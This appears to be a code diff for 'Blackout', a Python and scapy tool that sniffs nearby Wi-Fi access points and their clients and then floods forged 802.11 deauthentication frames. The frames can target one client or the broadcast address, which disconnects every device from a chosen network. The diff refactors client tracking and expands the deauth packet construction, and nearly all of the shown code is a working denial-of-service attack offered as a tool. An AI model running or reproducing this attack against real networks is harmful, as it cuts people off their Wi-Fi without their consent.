@@ -25,7 +25,6 @@ conf.verb = 0
 
 # silence unwanted scapy output
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-
 BROADCAST_ADDR = "FF:FF:FF:FF:FF:FF"
 
 
@@ -54,8 +53,8 @@ class Blackout:
         self.vendors = Utils.compile_vendors()
 
         self.ap_dict = dict()
+        self.ap_clients = dict()
         self.all_bssid = list()
-        self.ap_clients = list()
         self.lock = Lock()
 
         self.main_display = TriggerList(self.update_display)
@@ -67,7 +66,6 @@ class Blackout:
         self.thread_channel_hop = Thread(
             target=Blackout.channel_hop,
             args=(str(interface),))
-
         self.thread_channel_hop.daemon = True
 
         # Thread to listen for user input in curses
@@ -90,7 +88,7 @@ class Blackout:
         self.sniff_ap_thread.daemon = True
 
         # Client sniffer Thread
-        self.proc_sniff_clients = Thread(
+        self.sniff_clients_thread = Thread(
             target=sniff,
             kwargs={
                 'prn': self.sniff_clients,
@@ -105,6 +103,7 @@ class Blackout:
 
         # Flag indicating user is choosing deauth option
         self.choosing = False
+
         # Holds the users menu choice as integer
         self.choice = None
 
@@ -153,10 +152,12 @@ class Blackout:
         self.main_display.append(f"[+] Putting {self.iface} into MONITOR mode...\n")
         self.main_display.append(f"[+] Stopping any interfering processes...\n")
 
-        status = self.utils.start_mon()
-
-        if status is False:
-            raise Exception(f"[!!] Could not put {self.iface} into MONITOR mode")
+        try:
+            status = self.utils.start_mon()
+            if status is False:
+                raise Exception(f"[!!] Could not put {self.iface} into MONITOR mode")
+        except Exception as e:
+            self.error(e)
 
     def start_threads(self):
         # Start daemon threads
@@ -170,8 +171,12 @@ class Blackout:
 
         event = self.ap_update_event if self.phase == 'AP' else self.client_update_event
 
-        self.main_display.append("[+] Sniffing Access Points on all channels\n")
-        self.main_display.append("[+] Press 's' to select a target. 'q' to quit\n")
+        self.output("[+] Sniffing Access Points on all channels\n")
+        self.output("[+] Press 's' to select a target. 'q' to quit\n")
+        self.output(Utils.print_headers())
+
+        self.sniff_ap_thread.start()
+        self.sniff_clients_thread.start()
 
         # if self.phase == 'AP':
         #     self.main_display.append("[+] Sniffing for Access Points on all channels\n")
@@ -201,9 +206,10 @@ class Blackout:
             self.main_display.append(f"Clients discovered: {len(self.ap_clients)}\n\n")
 
     def deauth_menu_choice(self):
-        self.main_display.append(self.utils.choice_string())
+        self.main_display.append(choice_string())
         self.choosing = True
-        while self.choosing and self.choice is None: pass
+        while self.choosing and self.choice is None:
+            pass
 
     def start_deauth(self):
         self.deauth_menu_choice()
@@ -239,7 +245,7 @@ class Blackout:
         self.main_display.append(str(self.target_id))
 
         if phase == 'AP':
-            #  FORMAT: _ap_dict[count] = [bssid, ssid, channel, [clients, .. , ]]
+            #  FORMAT: ap_dict[count] = [bssid, ssid, channel, [clients, .. , ]]
             self.target_ap = self.ap_dict[self.target_id]
 
             outputs = [
@@ -275,8 +281,8 @@ class Blackout:
             self.start_deauth()
 
         except Exception as e:
-            self.main_display.append(f"[!] Error: {e}\n")
             Utils.log_error_to_file(traceback.format_exc())
+            self.error(e)
 
         except KeyboardInterrupt:
             pass
@@ -291,11 +297,15 @@ class Blackout:
         """
 
         self.deauth_active = True
+        deauth_all = False
 
         if target is BROADCAST_ADDR:
-            self.main_display.append(f"\n[*] Deauthenticating ALL clients from {bssid} on channel {channel}...\n")
+            deauth_all = True
+            self.main_display.append(
+                f"\n[*] Deauthenticating ALL clients from {bssid} on channel {channel}...\n")
         else:
-            self.main_display.append(f"[*] deauth {target} from {bssid} on channel {channel}...\n")
+            self.main_display.append(
+                f"[*] deauth {target} from {bssid} on channel {channel}...\n")
 
         self.main_display.append("[*] Press 's' to stop.\n")
 
@@ -303,9 +313,20 @@ class Blackout:
             go_to_chan = Popen(['iw', 'dev', 'wlan0', 'set', 'channel', channel], stdout=PIPE)
             go_to_chan.communicate()
 
-            dot11 = Dot11(type=0, subtype=12, addr1=target, addr2=bssid, addr3=bssid)
+            packets = []
+            dot11_to_ap = Dot11(
+                type=0, subtype=12, addr1=target, addr2=bssid, addr3=bssid) / Dot11Deauth()
+            dot11_to_client = Dot11(
+                type=0, subtype=12, addr1=bssid, addr2=target, addr3=target) / Dot11Deauth()
+            packets.append([dot11_to_ap, dot11_to_client])
+
+            if deauth_all:
+                dot11_to_bcast = Dot11(
+                    type=0, subtype=12, addr1=BROADCAST_ADDR, addr2=bssid, addr3=bssid) / Dot11Deauth()
+                packets.append(dot11_to_bcast)
+
             # create deauth packet for AP and add to list
-            deauth_pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)
+            # deauth_pkt = dot11/Dot11Deauth() #RadioTap() / dot11 / Dot11Deauth(reason=7)
 
             # send it
             # TODO: Use of a for loop for this is unconvential,
@@ -314,30 +335,30 @@ class Blackout:
             try:
                 while self.deauth_active:
                     self.main_display.append(".")
-                    sendp(deauth_pkt, inter=0.1, count=1, iface=conf.iface)
+                    for pkt in packets:
+                        sendp(pkt, inter=0.1, count=1, iface=conf.iface)
 
             except KeyboardInterrupt:
                 pass
 
             except Exception as e:
-                print(f"[!] Error: {e}")
-                self.utils.stop_mon()
+                self.error(e)
+                self.exit_application('main')
                 sys.exit(0)
 
             self.main_display.append("[*] Deauthentication Complete\n")
             return
 
         except Exception as e:
-            print(f"[!] Error while Deauthenticating: {e}\n")
+            self.error(e)
 
     def sniff_access_points(self, pkt):
         """
         Sniff packets, and extract info from them
-        addr1=destination, addr2=source, addr3=bssid
+        addr1=destination, addr2=source, addr3=transmitter
         """
         # Here scapy is going to check whether each sniffed packet
-        # has particular 'layers' of encapsulation
-        # and act accordingly
+        # has particular 'layers' of encapsulation and act accordingly
 
         if not self.ap_update_event.is_set():
             return
@@ -347,79 +368,110 @@ class Blackout:
             if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
 
                 # If the packet contains a BSSID we have not encountered
-                if pkt.addr3.upper() not in self.all_bssid:  # addr3 -> BSSID
-                    bssid = pkt.addr3.upper()  # add the bssid to our bssid list
-                    self.all_bssid.append(bssid)
-
-                    try:
-                        count = len(self.ap_dict) + 1  # No. of AP's collected
-                        ssid = pkt[3].info.decode()  # Extract SSID
-                        if not re.match(r'[\w\-\.]+', ssid):  # Check for valid SSID
-                            ssid = "*HIDDEN/NONE*"  # SSID is hidden
-
-                        # credit to airoscapy.py(by iphelix) for this
-                        # It's decoding the channel info from an awkward hex formatting('/x03' etc.)
-
-                        channel = ord(pkt[Dot11Elt:3].info)
-
-                        # Add Access-Point to the 'cross-process' dict
-                        vendor = self.get_vendor(bssid)
-                        self.ap_dict[count] = {'bssid': bssid, 'ssid': ssid, 'channel': channel, 'vendor': vendor}
-
-                        # Output the catch
-                        found_ap = f"\n{count}\t%-20s\t%-20s\t{channel}\t\t%-20s\n" % (ssid, bssid, vendor)
-                        self.main_display.append(found_ap)
-
-                    except Exception as e:
-                        if "ord" in f"{e}":  # TODO This may be to do with 5GHz channels cropping up?
-                            pass
-                        else:
-                            Utils.log_error_to_file(traceback.format_exc())
+                if pkt.addr3.upper() not in self.ap_clients:
+                    access_point = pkt.addr3.upper()
+                    # Add Access-Point to ap_dict
+                    self.add_access_point(access_point, pkt)
 
     def sniff_clients(self, pkt):
-        """
-        addr1=destination, addr2=source, addr3=bssid
-        """
-
-        if not self.client_update_event.is_set():
-            return
-
-        # Go to correct channel
-        channel = str(self.target_ap['channel'])
-        go_to_chan = Popen(['iw', 'dev', 'wlan0', 'set', 'channel', channel], stdout=PIPE)
-        go_to_chan.communicate()
-
-        # IF right type of frame, and not involved in authentication
         try:
-            if pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type in (1, 2):  # and not pkt.haslayer(EAPOL):
+            if pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type in (1, 2):
                 # Packet is a Data or Control Frame
                 if pkt.addr1 and pkt.addr2:
-
                     # Get destination and source MAC addresses
                     dst = pkt.addr1.upper()
                     src = pkt.addr2.upper()
 
                     # If the target AP is either source or destination, we know the other is a client
-                    if BROADCAST_ADDR not in (dst, src):
-                        if src == self.target_bssid and dst not in self.ap_clients:
-                            self.main_display.append("here 1\n")
-                            self.ap_clients.append(dst)
-                            self.main_display.append(f"[*] {dst}\t{self.get_vendor(dst)}\n")
-
-                        elif dst == self.target_bssid and src not in self.ap_clients:
-                            self.main_display.append("here 2\n")
-                            self.ap_clients.append(src)
-                            self.main_display.append(f"[*] {src}\t{self.get_vendor(src)}\n")
+                    if BROADCAST_ADDR not in [dst, src]:
+                        if src in self.ap_dict and not self.is_client(src, dst):
+                            self.add_client(src, dst)
+                        elif dst in self.ap_dict and not self.is_client(dst, src):
+                            self.add_client(dst, src)
 
         except Exception as e:
             Utils.log_error_to_file(traceback.format_exc())
+            self.error(e)
 
         except KeyboardInterrupt:
             pass
 
+    def is_client(self, ap, client):
+        return client in self.ap_dict[ap]['clients']
+
+    def add_access_point(self, access_point, pkt):
+        try:
+            ssid = pkt[3].info.decode()
+            if not re.match(r'[\w\-\.]+', ssid):  # Check for valid SSID
+                ssid = "*HIDDEN/NONE*"
+
+            # From airoscapy.py (by iphelix)
+            # It's decoding the channel info from an awkward hex formatting('/x03' etc.)
+            channel = ord(pkt[Dot11Elt:3].info)
+            vendor = self.get_vendor(access_point)
+            ap_id = len(self.ap_dict) + 1  # No. of AP's collected
+
+            self.ap_dict[access_point] = {
+                'id': ap_id, 'ssid': ssid, 'channel': channel, 'vendor': vendor, 'clients': []}
+
+            # Output the AP details
+            description = f"\n{ap_id}\t%-20s\t%-20s\t{channel}\t\t%-20s\n" % (ssid, access_point, vendor)
+            self.output(description)
+
+        except Exception as e:
+            if "ord" in f"{e}":  # TODO This may be to do with 5GHz channels cropping up?
+                pass
+            else:
+                Utils.log_error_to_file(traceback.format_exc())
+                self.error(e)
+
+    def add_client(self, access_point, new_client):
+        self.ap_dict[access_point]['clients'].append(new_client)
+
+    # def sniff_clients(self, pkt):
+    #     """
+    #     addr1=destination, addr2=source, addr3=bssid
+    #     """
+    #
+    #     if not self.client_update_event.is_set():
+    #         return
+    #
+    #     # Go to correct channel
+    #     channel = str(self.target_ap['channel'])
+    #     go_to_chan = Popen(['iw', 'dev', 'wlan0', 'set', 'channel', channel], stdout=PIPE)
+    #     go_to_chan.communicate()
+    #
+    #     # IF right type of frame, and not involved in authentication
+    #     try:
+    #         if pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type in (1, 2):  # and not pkt.haslayer(EAPOL):
+    #             # Packet is a Data or Control Frame
+    #             if pkt.addr1 and pkt.addr2:
+    #
+    #                 # Get destination and source MAC addresses
+    #                 dst = pkt.addr1.upper()
+    #                 src = pkt.addr2.upper()
+    #
+    #                 # If the target AP is either source or destination, we know the other is a client
+    #                 if BROADCAST_ADDR not in (dst, src):
+    #                     if src == self.target_bssid and dst not in self.ap_clients:
+    #                         self.main_display.append("here 1\n")
+    #                         self.ap_clients.append(dst)
+    #                         self.main_display.append(f"[*] {dst}\t{self.get_vendor(dst)}\n")
+    #
+    #                     elif dst == self.target_bssid and src not in self.ap_clients:
+    #                         self.main_display.append("here 2\n")
+    #                         self.ap_clients.append(src)
+    #                         self.main_display.append(f"[*] {src}\t{self.get_vendor(src)}\n")
+    #
+    #     except Exception as e:
+    #         Utils.log_error_to_file(traceback.format_exc())
+    #         self.error(e)
+    #
+    #     except KeyboardInterrupt:
+    #         pass
+
     # TODO move to utils
     def get_vendor(self, bssid):
-        name = ""
         try:
             name = self.vendors[bssid[:8]]
         except KeyError:
@@ -455,7 +507,7 @@ class Blackout:
                     sleep(1)  # TODO -- Experiment with different values
                 except KeyboardInterrupt:
                     break
-                except Exception as e:
+                except Exception:
                     pass
 
     def exit_curses(self):
@@ -469,17 +521,22 @@ class Blackout:
 
         self.to_window(f"[!!] Putting {self.iface} back into MANAGED mode...")
 
-        status = self.utils.stop_mon()
-        if not status:
-            raise Exception("[!] Error putting {self.iface} into MANAGED mode")
+        try:
+            status = self.utils.stop_mon()
+            if not status:
+                raise Exception("[!] Error putting {self.iface} into MANAGED mode")
 
-        self.exit_curses()
+            self.exit_curses()
 
-        if source == 'thread':
-            os._exit(1)
+            if source == 'thread':
+                os.kill(os.getpid(), signal.SIGINT)
+                sys.exit(0)
 
-        if source == 'main':
-            sys.exit(0)
+            if source == 'main':
+                sys.exit(0)
+
+        except Exception as e:
+            self.error(e)
 
     def start_curses(self):
         # Setup curses
@@ -515,6 +572,12 @@ class Blackout:
         """
         sleep(1)
         self.exit_application()
+
+    def error(self, error):
+        self.main_display.append(f"[!] Error: {error}\n")
+
+    def output(self, msg):
+        self.main_display.append(msg)
 
 
 if __name__ == "__main__":
